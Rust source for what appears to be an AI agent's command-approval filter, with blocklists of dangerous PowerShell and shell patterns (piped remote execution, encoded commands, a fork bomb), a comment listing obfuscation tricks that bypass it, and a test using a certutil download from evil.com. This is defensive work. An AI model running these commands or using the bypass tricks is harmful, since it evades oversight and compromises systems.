use crate::config::TrustedPattern;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ApprovalLevel {
    AutoApprove,
    NeedsConfirmation,
    Blocked,
}

/// SAFETY NOTICE: The command filtering in this module is a **heuristic safety layer**
/// (speed-bump), NOT a security sandbox. PowerShell provides many obfuscation techniques
/// that can bypass simple string matching, for example:
///   - Variable indirection: `$p = "Remove-Item"; & $p ...`
///   - String concatenation: `& ("Remove" + "-Item") ...`
///   - Invoke-Expression: `IEX 'Remove-Item ...'`
///   - Base64 encoding: `powershell -Enc <base64>`
///
/// To achieve true sandboxing, consider running commands in a restricted runspace
/// or a lower-privilege process. This heuristic is designed to catch common
/// dangerous patterns and provide a reasonable UX trade-off for typical usage.

/// Extract the primary command name from a PowerShell command string.
/// Handles: `Get-Command arg`, `cmd.exe /c ...`, `C:\path\to\exe arg`, etc.
fn extract_command_name(cmd: &str) -> String {
    let trimmed = cmd.trim();

    if trimmed.starts_with('$') {
        return trimmed.to_lowercase();
    }

    let first_segment = trimmed.split('|').next().unwrap_or(trimmed).trim();
    let first_cmd = first_segment.split(';').next().unwrap_or(first_segment).trim();

    let tokens: Vec<&str> = first_cmd.split_whitespace().collect();
    let mut token_idx = 0;

    if let Some(first) = tokens.first() {
        if *first == "&" || *first == "." || *first == ".\\" || *first == "./" {
            token_idx = 1;
        }
    }

    if token_idx >= tokens.len() {
        return trimmed.to_lowercase();
    }

    let mut token = tokens[token_idx];

    // Strip leading call operator & if attached to the command name, e.g. &certutil or &"certutil"
    if token.starts_with('&') && token.len() > 1 {
        token = &token[1..];
    }

    // Strip surrounding quotes if present, e.g. "certutil" -> certutil, or 'certutil' -> certutil
    let token_trimmed = token.trim_matches(|c| c == '"' || c == '\'');

    let first_cmd_clean = token_trimmed
        .strip_prefix(".\\")
        .or_else(|| token_trimmed.strip_prefix("./"))
        .unwrap_or(token_trimmed);

    let name = if first_cmd_clean.contains('\\') || first_cmd_clean.contains('/') {
        first_cmd_clean
            .rsplit(|c| c == '\\' || c == '/')
            .next()
            .unwrap_or(first_cmd_clean)
    } else {
        first_cmd_clean
    };

    // Strip surrounding quotes again in case of quoted executables inside path segments
    let name_trimmed = name.trim_matches(|c| c == '"' || c == '\'');

    let name_trimmed = name_trimmed
        .strip_suffix(".exe")
        .or_else(|| name_trimmed.strip_suffix(".ps1"))
        .or_else(|| name_trimmed.strip_suffix(".bat"))
        .or_else(|| name_trimmed.strip_suffix(".cmd"))
        .unwrap_or(name_trimmed);
    name_trimmed.to_lowercase()
}

/// Check if a command contains compound syntax that could bypass whitelist matching.
/// Commands with these operators should not be auto-approved based on prefix matching.
fn has_compound_syntax(cmd: &str) -> bool {
    // Skip checking inside quoted strings
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let chars: Vec<char> = cmd.chars().collect();

    for i in 0..chars.len() {
        let c = chars[i];
        if c == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
        } else if c == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
        } else if !in_single_quote && !in_double_quote {
            // Semicolon: command chaining
            if c == ';' {
                return true;
            }
            // Pipe operator (| but not ||)
            if c == '|' && (i + 1 >= chars.len() || chars[i + 1] != '|') && (i == 0 || chars[i - 1] != '|') {
                return true;
            }
            // Backtick (PowerShell line continuation / escape)
            if c == '`' {
                return true;
            }
            // Redirect operators: >, >>, 2>, < (but not inside paths like C:\>)
            if c == '>' {
                return true;
            }
            if c == '<' && i > 0 && chars[i - 1] != '\\' && chars[i - 1] != '/' {
                return true;
            }
            // Subexpression $(...)
            if c == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
                return true;
            }
        }
    }
    false
}

pub fn check_approval(
    tool_name: &str,
    args_str: &str,
    approval_policy: &str,
    trusted_patterns: &[TrustedPattern],
) -> ApprovalLevel {
    // 1. Check high-risk commands (blocklist as safety net)
    if is_high_risk(tool_name, args_str) {
        return ApprovalLevel::Blocked;
    }

    // 2. Read-only tools auto-approve
    let read_only = matches!(tool_name, "read_file" | "list_dir" | "web_search");
    if read_only {
        return ApprovalLevel::AutoApprove;
    }

    // 3. Check trusted patterns (whitelist)
    if is_trusted(tool_name, args_str, trusted_patterns) {
        return ApprovalLevel::AutoApprove;
    }

    // 4. Strict policy: everything except reads needs confirmation
    if approval_policy == "strict" {
        return ApprovalLevel::NeedsConfirmation;
    }

    // 5. Relaxed policy: only untrusted writes need confirmation
    if approval_policy == "relaxed" {
        if tool_name == "write_file" || tool_name == "execute_command" || tool_name == "run_python" {
            return ApprovalLevel::NeedsConfirmation;
        }
        return ApprovalLevel::AutoApprove;
    }

    // 6. Standard policy: writes and commands need confirmation
    ApprovalLevel::NeedsConfirmation
}

/// Check if a command is high-risk and should be blocked.
/// This is a safety net — the primary defense is the whitelist.
fn is_high_risk(tool_name: &str, args_str: &str) -> bool {
    if tool_name != "execute_command" {
        return false;
    }

    let args: serde_json::Value = match serde_json::from_str(args_str) {
        Ok(v) => v,
        Err(_) => return false,
    };
    let cmd = match args["command"].as_str() {
        Some(c) => c,
        None => return false,
    };

    let cmd_lower = cmd.to_lowercase();
    let cmd_lower = cmd_lower.replace('/', "\\");
    let cmd_trimmed = cmd_lower.trim();

    // Extract the primary command name for targeted checks
    let cmd_name = extract_command_name(cmd_trimmed);

    // === Absolutely blocked executables ===
    let blocked_executables = [
        "format-volume",
        "remove-partition",
        "diskpart",
        "certutil",
        "bitsadmin",
        "mshta",
        "wscript",
        "cscript",
        "regsvr32",
        "mofcomp",
    ];
    if blocked_executables.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous PowerShell cmdlets ===
    let blocked_cmdlets = [
        "set-executionpolicy",
        "stop-process",
        "enable-psremoting",
        "disable-psremoting",
        "enter-pssession",
        "new-pssession",
        "remove-service",
        "restart-service",
        "set-service",
    ];
    if blocked_cmdlets.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous command patterns (substring match) ===
    let blocked_patterns = [
        // System directory deletion
        "remove-item c:\\windows",
        "del c:\\windows",
        "rm c:\\windows",
        "remove-item \"c:\\windows",
        "remove-item 'c:\\windows",
        "remove-item c:\\program files",
        "del c:\\program files",
        "rm c:\\program files",
        // Recursive force deletion of large paths
        "remove-item -recurse -force c:\\",
        "remove-item -r -force c:\\",
        // User management
        "net user * /delete",
        "net user /delete",
        "net localgroup",
        "new-localuser",
        "remove-localuser",
        // Registry modification
        "reg add",
        "reg delete",
        "reg import",
        "set-itemproperty hklm:",
        "new-itemproperty hklm:",
        "remove-itemproperty hklm:",
        // Scheduled tasks (creation)
        "schtasks /create",
        "schtasks /change",
        // Service creation
        "sc create",
        "sc config",
        // Remote script execution patterns
        "curl | sh",
        "curl | bash",
        "curl|sh",
        "curl|bash",
        "wget | sh",
        "wget | bash",
        "irm | iex",
        "irm|iex",
        "invoke-expression",
        "| iex",
        // Encoded / hidden PowerShell (common attack pattern)
        "-enc ",
        "-encodedcommand ",
        "-w hidden",
        "-windowstyle hidden",
        "-noninteractive -nop",
        // Unix-style catastrophic commands
        "rm -rf /",
        "rm -rf c:\\",
        ":(){ :|:& };:",
        // Dangerous redirects
        "> c:\\windows",
        "> c:\\program files",
    ];

    for pattern in &blocked_patterns {
        if cmd_trimmed.contains(pattern) {
            return true;
        }
    }

    // === Block invoke-expression with variable/pipe input ===
    if cmd_name == "invoke-expression" || cmd_name == "iex" {
        return true;
    }

    false
}

/// Check if a tool call matches a trusted pattern (whitelist).
fn is_trusted(tool_name: &str, args_str: &str, patterns: &[TrustedPattern]) -> bool {
    for p in patterns {
        if p.tool_name != tool_name {
            continue;
        }

        match tool_name {
            "execute_command" => {
                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
                    if let Some(cmd) = args["command"].as_str() {
                        let cmd_trimmed = cmd.trim();
                        let pattern_trimmed = p.pattern.trim();

                        // Block compound syntax from auto-approval to prevent bypass
                        // e.g. "git status; Set-Content x y" should not match "git status"
                        if has_compound_syntax(cmd_trimmed) {
                            continue; // Skip this pattern, don't auto-approve
                        }

                        // Match: command starts with pattern, or command name matches
                        if cmd_trimmed.to_lowercase().starts_with(&pattern_trimmed.to_lowercase()) {
                            return true;
                        }
                        // Also match by extracted command name
                        let cmd_name = extract_command_name(cmd_trimmed);
                        if cmd_name == pattern_trimmed.to_lowercase() {
                            return true;
                        }
                    }
                }
            }
            "write_file" => {
                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
                    if let Some(path) = args["path"].as_str() {
                        if path.to_lowercase().starts_with(&p.pattern.to_lowercase()) {
                            return true;
                        }
                    }
                }
            }
            "run_python" => {
                // For Python, trust the whole tool if it's in the whitelist
                if p.pattern == "*" || p.pattern == "run_python" {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_command_name() {
        assert_eq!(extract_command_name("Get-ChildItem"), "get-childitem");
        assert_eq!(extract_command_name("git status"), "git");
        assert_eq!(extract_command_name("npm list --depth=0"), "npm");
        assert_eq!(extract_command_name("C:\\Python\\python.exe script.py"), "python");
        assert_eq!(extract_command_name(".\\build.ps1"), "build");
        assert_eq!(extract_command_name("echo hello | Out-File"), "echo");
        assert_eq!(extract_command_name("dir; Remove-Item x"), "dir");

        // Advanced call operator, quote, and slash tests
        assert_eq!(extract_command_name("&certutil -urlcache"), "certutil");
        assert_eq!(extract_command_name("&\"certutil\" -urlcache"), "certutil");
        assert_eq!(extract_command_name("& \"certutil\" -urlcache"), "certutil");
        assert_eq!(extract_command_name("C:/Python/python.exe script.py"), "python");
        assert_eq!(extract_command_name("\"C:\\Python\\python.exe\" script.py"), "python");
        assert_eq!(extract_command_name("& \"./build.ps1\""), "build");
        assert_eq!(extract_command_name("&./build.ps1"), "build");
        assert_eq!(extract_command_name("& .\\build.ps1"), "build");
    }

    #[test]
    fn test_high_risk_blocked() {
        let args = serde_json::json!({"command": "Set-ExecutionPolicy Unrestricted"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "certutil -urlcache -split -f http://evil.com/payload.exe"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "powershell -enc abc123"}).to_string();
        assert!(is_high_risk("execute_command", &args));
    }

    #[test]
    fn test_safe_commands_not_blocked() {
        let args = serde_json::json!({"command": "Get-ChildItem"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "git status"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "npm list"}).to_string();
        assert!(!is_high_risk("execute_command", &args));
    }

    #[test]
    fn test_trusted_pattern_matching() {
        let patterns = vec![TrustedPattern {
            tool_name: "execute_command".into(),
            pattern: "git status".into(),
            created_at: 0,
        }];

        let args = serde_json::json!({"command": "git status"}).to_string();
        assert!(is_trusted("execute_command", &args, &patterns));

        let args = serde_json::json!({"command": "git push"}).to_string();
        assert!(!is_trusted("execute_command", &args, &patterns));
    }
}
